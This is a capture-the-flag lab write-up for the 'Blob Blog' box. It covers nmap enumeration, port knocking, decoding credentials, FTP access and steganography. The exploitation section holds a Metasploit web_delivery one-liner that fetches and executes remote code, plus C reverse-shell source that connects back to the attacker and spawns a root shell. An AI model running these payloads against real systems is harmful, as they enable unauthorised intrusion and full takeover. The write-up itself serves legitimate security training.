IP:10.10.92.220

Nmap scan results:
root@LAPTOP-U5913CMD:/home/akshay/Desktop# nmap -A -T4  10.10.92.220
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-12 11:46 IST
Nmap scan report for 10.10.92.220
Host is up (0.15s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 e7:28:a6:33:66:4e:99:9e:8e:ad:2f:1b:49:ec:3e:e8 (DSA)
|   2048 86:fc:ed:ce:46:63:4d:fd:ca:74:b6:50:46:ac:33:0f (RSA)
|   256 e0:cc:05:0a:1b:8f:5e:a8:83:7d:c3:d2:b3:cf:91:ca (ECDSA)
|_  256 80:e3:45:b2:55:e2:11:31:ef:b1:fe:39:a8:90:65:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|storage-misc
Running (JUST GUESSING): Crestron 2-Series (87%), HP embedded (85%)
OS CPE: cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3
Aggressive OS guesses: Crestron XPanel control system (87%), HP P2000 G3 NAS device (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   145.71 ms 10.9.0.1
2   145.94 ms 10.10.92.220


w3 checker - left to check


<!--
K1stLS0+Kys8XT4rLisrK1stPisrKys8XT4uLS0tLisrKysrKysrKy4tWy0+KysrKys8XT4tLisrKytbLT4rKzxdPisuLVstPisrKys8XT4uLS1bLT4rKysrPF0+LS4tWy0+KysrPF0+LS4tLVstLS0+KzxdPi0tLitbLS0tLT4rPF0+KysrLlstPisrKzxdPisuLVstPisrKzxdPi4tWy0tLT4rKzxdPisuLS0uLS0tLS0uWy0+KysrPF0+Li0tLS0tLS0tLS0tLS4rWy0tLS0tPis8XT4uLS1bLS0tPis8XT4uLVstLS0tPis8XT4rKy4rK1stPisrKzxdPi4rKysrKysrKysrKysuLS0tLS0tLS0tLi0tLS0uKysrKysrKysrLi0tLS0tLS0tLS0uLS1bLS0tPis8XT4tLS0uK1stLS0tPis8XT4rKysuWy0+KysrPF0+Ky4rKysrKysrKysrKysrLi0tLS0tLS0tLS0uLVstLS0+KzxdPi0uKysrK1stPisrPF0+Ky4tWy0+KysrKzxdPi4tLVstPisrKys8XT4tLi0tLS0tLS0tLisrKysrKy4tLS0tLS0tLS0uLS0tLS0tLS0uLVstLS0+KzxdPi0uWy0+KysrPF0+Ky4rKysrKysrKysrKy4rKysrKysrKysrKy4tWy0+KysrPF0+LS4rWy0tLT4rPF0+KysrLi0tLS0tLS4rWy0tLS0+KzxdPisrKy4tWy0tLT4rKzxdPisuKysrLisuLS0tLS0tLS0tLS0tLisrKysrKysrLi1bKys+LS0tPF0+Ky4rKysrK1stPisrKzxdPi4tLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+LlstLS0+Kys8XT4tLS4rKysrK1stPisrKzxdPi4tLS0tLS0tLS0uWy0tLT4rPF0+LS0uKysrKytbLT4rKys8XT4uKysrKysrLi0tLS5bLS0+KysrKys8XT4rKysuK1stLS0tLT4rPF0+Ky4tLS0tLS0tLS0uKysrKy4tLS4rLi0tLS0tLS4rKysrKysrKysrKysrLisrKy4rLitbLS0tLT4rPF0+KysrLitbLT4rKys8XT4rLisrKysrKysrKysrLi4rKysuKy4rWysrPi0tLTxdPi4rK1stLS0+Kys8XT4uLlstPisrPF0+Ky5bLS0tPis8XT4rLisrKysrKysrKysrLi1bLT4rKys8XT4tLitbLS0tPis8XT4rKysuLS0tLS0tLitbLS0tLT4rPF0+KysrLi1bLS0tPisrPF0+LS0uKysrKysrKy4rKysrKysuLS0uKysrK1stPisrKzxdPi5bLS0tPis8XT4tLS0tLitbLS0tLT4rPF0+KysrLlstLT4rKys8XT4rLi0tLS0tLi0tLS0tLS0tLS0tLS4tLS1bLT4rKysrPF0+Li0tLS0tLS0tLS0tLS4tLS0uKysrKysrKysrLi1bLT4rKysrKzxdPi0uKytbLS0+K
ysrPF0+Li0tLS0tLS0uLS0tLS0tLS0tLS0tLi0tLVstPisrKys8XT4uLS0tLS0tLS0tLS0tLi0tLS4rKysrKysrKysuLVstPisr
KysrPF0+LS4tLS0tLVstPisrPF0+LS4tLVstLS0+Kys8XT4tLg==
-->


Lets decode this.

When I was a kid, my friends and I would always knock on 3 of our neighbors doors.  Always houses 1, then 3, then 5!



<!--
Dang it Bob, why do you always forget your password?
I'll encode for you here so nobody else can figure out what it is:
HcfP8J54AK4
-->

Got this new thing coming.

Bob's password : cUpC4k3s


Ok so from the above decoded string, it gives us hint that we have to knock port number 1,3 and 5.


root@LAPTOP-U5913CMD:/home/akshay/Desktop# nmap -p- -T4 10.10.92.220
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-12 11:59 IST
Stats: 0:01:11 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 20.36% done; ETC: 12:04 (0:04:38 remaining)
Stats: 0:05:59 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.41% done; ETC: 12:05 (0:00:02 remaining)
Nmap scan report for 10.10.92.220
Host is up (0.15s latency).
Not shown: 65529 closed ports
PORT     STATE    SERVICE
21/tcp   open     ftp
22/tcp   open     ssh
80/tcp   open     http
445/tcp  open     microsoft-ds
5355/tcp filtered llmnr
8080/tcp open     http-proxy



Ohh good it is working.Lets make a service scan now.

root@LAPTOP-U5913CMD:/home/akshay/Desktop# nmap -sV -p21,22,80,445,5355,8080 -T4 10.10.92.220
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-12 12:06 IST
Nmap scan report for 10.10.92.220
Host is up (0.14s latency).

PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 3.0.2
22/tcp   open     ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http    Apache httpd 2.4.7 ((Ubuntu))
445/tcp  open     http    Apache httpd 2.4.7 ((Ubuntu))
5355/tcp filtered llmnr
8080/tcp open     http    Werkzeug httpd 1.0.1 (Python 3.5.3)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.37 seconds
root@LAPTOP-U5913CMD:/home/akshay/Desktop#

Bob, I swear to goodness, if you can't remember p@55w0rd
It's not that hard
-->


Lets try to see if we can login via ftp

root@LAPTOP-U5913CMD:/home/akshay# ftp 10.10.92.220
Connected to 10.10.92.220.
220 (vsFTPd 3.0.2)
Name (10.10.92.220:root): bob
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001         8980 Jul 25 13:07 examples.desktop
dr-xr-xr-x    3 65534    65534        4096 Jul 25 13:08 ftp
226 Directory send OK.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xr-xr-x    3 1001     1001         4096 Jul 25 13:08 .
dr-xr-xr-x    3 1001     1001         4096 Jul 25 13:08 ..
-rw-r--r--    1 1001     1001          220 Jul 25 13:07 .bash_logout
-rw-r--r--    1 1001     1001         3771 Jul 25 13:07 .bashrc
-rw-r--r--    1 1001     1001          675 Jul 25 13:07 .profile
-rw-r--r--    1 1001     1001         8980 Jul 25 13:07 examples.desktop
dr-xr-xr-x    3 65534    65534        4096 Jul 25 13:08 ftp
226 Directory send OK.
ftp> cd ftp
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xr-xr-x    3 65534    65534        4096 Jul 25 13:08 .
dr-xr-xr-x    3 1001     1001         4096 Jul 25 13:08 ..
drwxr-xr-x    2 1001     1001         4096 Jul 28 15:05 files
226 Directory send OK.
ftp> cd files
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Jul 28 15:05 .
dr-xr-xr-x    3 65534    65534        4096 Jul 25 13:08 ..
-rw-r--r--    1 1001     1001         8183 Jul 28 15:05 cool.jpeg
226 Directory send OK.
ftp> get cool.jpeg
local: cool.jpeg remote: cool.jpeg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cool.jpeg (8183 bytes).
226 Transfer complete.

root@LAPTOP-U5913CMD:/home/akshay/Desktop/Blobblog# steghide extract -sf cool.jpeg
Enter passphrase:
wrote extracted data to "out.txt".
root@LAPTOP-U5913CMD:/home/akshay/Desktop/Blobblog# ls
cool.jpeg  out.txt
root@LAPTOP-U5913CMD:/home/akshay/Desktop/Blobblog# cat out.txt
zcv:p1fd3v3amT@55n0pr
/bobs_safe_for_stuff
root@LAPTOP-U5913CMD:/home/akshay/Desktop/Blobblog#


So I used the p@55w0rd for get the out.txt

Thats cool..

/bobs_safe_for_stuff - Man this is the thing haha

Remember this next time bob, you need it to get into the blog! I'm taking this down tomorrow, so write it down!
- youmayenter
youmayenter

zcv:p1fd3v3amT@55n0pr

This looks like vignere cipher and we can use "youmayenter" as key to decode this bad boi


bob:d1ff3r3ntP@55w0rd

http://10.10.92.220:8080/blog

It works cool.

http://10.10.92.220:8080/review

This seems to be injectable and we can use web_delivery module from metasploit.

msf6 exploit(multi/script/web_delivery) > set lhost tun0
lhost => 10.9.81.62
msf6 exploit(multi/script/web_delivery) > options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.9.81.62       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Python


]msf6 exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.9.81.62:4444
[*] Using URL: http://0.0.0.0:8080/urvaAL3s
[*] Local IP: http://172.22.223.229:8080/urvaAL3s
[*] Server started.
[*] Run the following command on the target machine:
msf6 exploit(multi/script/web_delivery) > python -c "import sys;import ssl;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://10.9.81.62:8080/urvaAL3s', context=ssl._create_unverified_context());exec(r.read());"
[*] 10.10.92.220     web_delivery - Delivering Payload (493 bytes)
[*] Sending stage (39328 bytes) to 10.10.92.220
[*] Meterpreter session 1 opened (10.9.81.62:4444 -> 10.10.92.220:42078) at 2020-11-12 12:32:01 +0530


Just run that script into the input section and go to /review.

meterpreter > sysinfo
Computer        : bobloblaw-VirtualBox
OS              : Linux 4.10.0-19-generic #21-Ubuntu SMP Thu Apr 6 17:04:57 UTC 2017
Architecture    : x64
System Language : en_US
Meterpreter     : python/linux
meterpreter >


meterpreter > shell
Process 8702 created.
Channel 1 created.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@bobloblaw-VirtualBox:~/html2$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

I got to know using this command:

find / -perm -u=s -type f 2>/dev/null

www-data@bobloblaw-VirtualBox:/usr/bin$ strings ./blogFeedback
strings ./blogFeedback
/lib64/ld-linux-x86-64.so.2
RBz]
libc.so.6
puts
setreuid
system
atoi
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH

[]A\A]A^A_
Order my blogs!
Hmm... I disagree!
Now that, I can get behind!
/bin/sh
;*3$"


Ok so I had to look at one of the write-up as I am not so good with reverse-engineering
I found this good write-up that explains and I got to know a lot from that.

https://www.aldeid.com/wiki/TryHackMe-The-Blob-Blog


www-data@bobloblaw-VirtualBox:/usr/bin$ ./blogFeedback 6 5 4 3 2 1
./blogFeedback 6 5 4 3 2 1
Now that, I can get behind!
$ id
id
uid=1000(bobloblaw) gid=33(www-data) groups=33(www-data)
$


Privilege EScalation:

I tried looking for a lot of things using linpeas.sh but I didnot get anything.

The system is full of rabbitholes.

THere was this message displaying Jeez You haven't got root.

THere might be cron job running to execute that thing.

So I found this binary

bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Documents/.also_boring$ ls -la
ls -la
total 20
drwxrwx--- 2 bobloblaw bobloblaw 4096 Nov 12 02:48 .
drwxr-xr-x 3 bobloblaw bobloblaw 4096 Jul 30 09:33 ..
-rwxr-xr-x 1 root      root      8424 Nov 12 02:48 .still_boring
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Documents/.also_boring$

Lets see what we can do to manipulate this bad boi.

#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#define REMOTE_ADDR "10.9.81.62"
#define REMOTE_PORT 1222

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0);
    return 0;
}


cat .boring_file.c

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main (int argc, char **argv)
{
  int scktd;
  struct sockaddr_in client;

  client.sin_family = AF_INET;
  client.sin_addr.s_addr = inet_addr("10.9.81.62");
  client.sin_port = htons(1222);

  scktd = socket(AF_INET,SOCK_STREAM,0);
  connect(scktd,(struct sockaddr *)&client,sizeof(client));

  dup2(scktd,0); // STDIN
  dup2(scktd,1); // STDOUT
  dup2(scktd,2); // STDERR

  execl("/bin/sh","sh","-i",NULL,NULL);

  return 0;
}

bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Documents$

Lets listen for incoming connections now.



root@LAPTOP-U5913CMD:/home/akshay# nc -nvlp 1222
Listening on 0.0.0.0 1222
Connection received on 10.10.239.172 46656
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)

Thank you.. Happy Hacking :)
